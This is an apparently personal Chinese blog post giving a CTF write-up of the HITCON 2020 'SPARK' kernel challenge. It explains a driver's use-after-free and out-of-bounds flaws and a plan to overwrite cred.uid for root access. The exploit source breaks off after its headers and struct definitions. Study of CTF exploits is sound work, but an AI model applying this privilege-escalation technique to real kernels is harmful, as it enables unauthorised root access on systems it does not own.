

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Yogdzewa">
  <meta name="keywords" content="">
  
    <meta name="description" content="让我逝逝这些CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="近期题目wp">
<meta property="og:url" content="https://yogdzewa.github.io/2022-09/Now-recent-ctf/index.html">
<meta property="og:site_name" content="Yogdzewa">
<meta property="og:description" content="让我逝逝这些CTF">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20221026212243834.png">
<meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
<meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
<meta property="og:image" content="https://itanium-cxx-abi.github.io/cxx-abi/warning.gif">
<meta property="article:published_time" content="2022-09-08T02:00:00.000Z">
<meta property="article:modified_time" content="2022-11-16T02:59:22.503Z">
<meta property="article:author" content="Yogdzewa">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://yogdzewa.github.io/image/recent_ctf/image-20221026212243834.png">
  
  
  <title>近期题目wp - Yogdzewa</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/obsidian.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"yogdzewa.github.io","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>(￣.￣)</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友链
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/image/edit2.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="近期题目wp">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-09-08 10:00" pubdate>
        2022年9月8日 上午
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      72k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      896 分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">近期题目wp</h1>
            
              <p class="note note-info">
                
                  不可视境界线最后变动于：2022年11月16日 上午
                
              </p>
            
            <div class="markdown-body">
              <h2 id="SPARK"><a href="#SPARK" class="headerlink" title="SPARK"></a>SPARK</h2><blockquote>
<p>HITCON CTF 2020</p>
</blockquote>
<ul>
<li>代码里面看到<code>_InterlockedExchangeAdd()</code>函数, 其实是IDA中对lock指令前缀的函数替换. </li>
</ul>
<blockquote>
<p>汇编为<code>lock xadd cs:cur_count, eax</code> </p>
<p>The LOCK prefix can be prepended only to the following instructions and only to those forms of the instructions<br>where the destination operand is a memory operand: ADD, ADC, AND, BTC, BTR, BTS, CMPXCHG, CMPXCH8B,<br>CMPXCHG16B, DEC, INC, NEG, NOT, OR, SBB, SUB, XOR, <strong>XADD</strong>, and XCHG.</p>
<p>xadd是Exchange and Add. </p>
</blockquote>
<ul>
<li>还有mutex的结构体…. 大小为32个字节. 包含了啥我就不看了.<br>没想到还是要注意一下, 后面用到了mutex中的owner成员, 当锁被使用时可以读取当前进程的current结构体地址, 从而发现cred结构体地址. </li>
<li><code>__fentry__</code>到底是个<a target="_blank" rel="noopener" href="https://www.brendangregg.com/blog/2019-10-15/kernelrecipes-kernel-ftrace-internals.html">啥</a> | <a target="_blank" rel="noopener" href="https://www.eet-china.com/mp/a41923.html">中文文章</a> </li>
<li><code>char (*names)[3]</code> pointer to an array of 3 chars. </li>
</ul>
<p>好吧看不懂, linux/spark.h又是什么东西. </p>
<p>艰难的继续看代码, spark.h应该是没给的… </p>
<ul>
<li>**fget()**函数的功能是通过文件描述符查找并返回file结构体<br>而node结构体应该在struct file中offset为200的位置. 但是我不知道file中哪个成员能存储这种信息. </li>
</ul>
<h3 id="来自mhackeroni队的wp启发"><a href="#来自mhackeroni队的wp启发" class="headerlink" title="来自mhackeroni队的wp启发:"></a>来自<a target="_blank" rel="noopener" href="https://mhackeroni.it/archive/2020/12/05/hitcon2020-all-writeups.html#spark">mhackeroni</a>队的wp启发:</h3><p>ioctl功能:</p>
<ul>
<li>Link (<code>0x4008d900</code>): takes two node descriptors A and B, and a edge weight, and creates the edges A-&gt;B and B-&gt;A;</li>
<li>Info (<code>0x8018d901</code>): provides information about the node;</li>
<li>Finalize (<code>0xd902</code>): finalizes the graph rooted in the node, preparing it for queries;</li>
<li>Query (<code>0xc010d903</code>): takes two node descriptors and calculates the total weight of the shortest path between them.</li>
</ul>
<p>在release中: 如果refcount==1(正常情况), 释放traversal中nodes(如果有), 释放edge链表节点, 释放node. </p>
<p>其中的一些细节:</p>
<ul>
<li>open时每个节点的refcount默认为1, 当finalize的时候只有root节点进入<code>traversal()</code>函数时(第一次进入)不增加refcount, 这就意味着除了root, 其他的节点的refcount都会变成2. 而当release root的时候只有root.refcount小于2, 于是只有root的edge+traversal+node本身都被<code>kfree()</code>. <strong>看似正常, 实际上?</strong> </li>
<li>Info中有一个node-&gt;traversal-&gt;size的访问链, 而size在traversal中offset为0的位置. 意味着如果能够控制traversal字段那就可以实现任意读. <strong>如何控制traversal?</strong> </li>
<li>finalize中调用函数traversal进行DFS, 对node的refcount进行+1, 然而在link和query中没有refcount的判断和使用, 而且在release中如果大于等于二则直接退出, 不会调用kfree回收空间. <strong>能否修改refcount?</strong> </li>
<li>link后相邻节点保存在edge中, 然而当另一端的节点free/release后, edge中的node就构成了一个dangling ptr. 可以用来UAF. <strong>如何控制freed chunk?(uffd+setxattr)</strong> </li>
<li>query中malloc了一个dis_arr, 使用node及其children的traversal_idx来索引. <strong>能否越界?(看到个数组都要想能不能越界…)</strong> </li>
<li>具体为uffd+setxattr控制free后的chunk, 再伪造一个(finalize==1 &amp;&amp; traversal_idx&gt;16)的node, 制造出一个OOB(还真能越界). <strong>这个OOB能够修改什么东西?</strong> </li>
</ul>
<p>一般的内核题目都是提权, 直接变成root用户就可以读取/flag文件, 方法大致有任意写原语或者commit+prepare_cred. </p>
<p>可能的思路整理:</p>
<ul>
<li>还原ko文件类型信息. 看看demo.c中的示例便于理解. </li>
<li>还原成功, 发现可能是kmalloc和kfree为主的内核堆利用. 先制造出一个任意读. </li>
<li>getinfo中发现可能的任意读(只要控制了traversal), 这样只要在fd存在的时候node结构体同时也被我们控制就可以做到; 发现mutex的使用, 其中的owner成员可以直通cred; 发现UAF; 发现refcount的问题. </li>
<li>发现traversal_idx是属于node的属性, 而不是某次traversal的. 当query的时候还用到了node的children, 也就是默认了所有的child都属于同一次traversal. </li>
<li>综上所述, 结合<a target="_blank" rel="noopener" href="https://duasynt.com/blog/linux-kernel-heap-spray">uffd+setxattr</a>的方法, 可以在link完一个网再release一个fd之后, 立刻使用这种方法来修改node的内容. 这算是一个基础步骤. 如何继续利用?</li>
<li>把node-&gt;traversal_idx修改超过dis_arr的边界, 在query的时候越界修改tmp_node的refcount, 这样在release root之后只有tmp_node+root的会被释放, 而tmp_node的fd反而不会被影响. 只要在这之后马上malloc就可以<strong>实现任意读</strong>了. <ul>
<li>还有个小问题是如何让dis_arr放到node的前面? exp给出了方法: 前后malloc一些node, 中间两百个node中每隔几个释放一个node, 而dis_arr的大小由traversal时遍历到的node数量决定, 设置链接的node数量为16或17(为什么呢?想想吧)时就会刚好占据了原先node的间隙, 满足了越界的位置需求. </li>
<li>然后<strong>读啥呢</strong>? </li>
</ul>
</li>
<li>可以读取<code>node.lock.owner</code>进而定位到<code>cred</code>, 而因为get_info的v3-&gt;size时候<code>mutex_lock(a1-&gt;state_lock);</code>已经锁上, 所以可以直接读取. </li>
<li>下一个问题在于node结构体在哪里? 所以要在读取owner之前扫描内存寻找我们设置的特殊值, 有了个任意读的能力确实也可以做到. <strong>扫哪里呢</strong>?</li>
<li>主要问题就在于现在一个内核地址都没有, <u>特别是用来kmalloc的那一块区域</u>. 但是! dmesg是可用的, 可以利用OOB制造一个crash, 然后读取寄存器信息进而获取相应地址. 这可以通过libc库实现, 具体见源码中的<strong>第一阶段</strong>.<br>另外发现这个crash会导致内核出错+进程暂停, 但是如果在一个fork出的child中直接让他exit就没有问题了. </li>
<li>到现在一二阶段和三阶段初始都已完成. 接下来的任务是如何<strong>制造任意写将cred中uid改成0(root)?</strong> </li>
<li>想到OOB, 理论上可以覆盖一个地址为与首个子节点的连接权值, 但要覆盖cred.uid的话还要知道dis_arr的地址. 又想到一阶段malloc了一个dis_arr且由于crash并没有释放, 如果此时通过release(fd)释放traversal再马上query, 既知道了地址(一阶段时)又得到了一个可用的dis_arr. </li>
<li>接下来就是构造一下所需的结构. 需要额外的一个root加上一些其他节点, 加上fd构成一张网, 把和fd的连接权值赋为0(并且is_finalized!=1)作为要写入的内容. 至于释放和造网两者的顺序想来是没有区别的. <ul>
<li>又一个细节是所用到的root和其他节点都是在第一阶段之前分配的. 或许是为了防止混乱. </li>
</ul>
</li>
<li>最后就是修改traversal_idx, 进行一个root的query, 然后就完成了cred.uid的覆盖. 最后的最后直接print /flag. </li>
</ul>
<p>这是36小时能做完的题目吗??</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/klog.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;semaphore.h&gt;</span> <span class="hljs-comment">//used to set uffd interface</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DEV_PATH <span class="hljs-meta-string">&quot;/dev/node&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_FINALIZE 0xd902</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_LINK 0x4008d900</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_QUERY 0xc010d903</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SPARK_INFO 0x8018D901</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_ioctl_query</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> fd1;<br>    <span class="hljs-keyword">int</span> fd2;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> distance;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_size;<br>&#125;;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> g_create_next_id;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">create</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> fd = open(DEV_PATH, O_RDONLY);<br>    assert(fd != <span 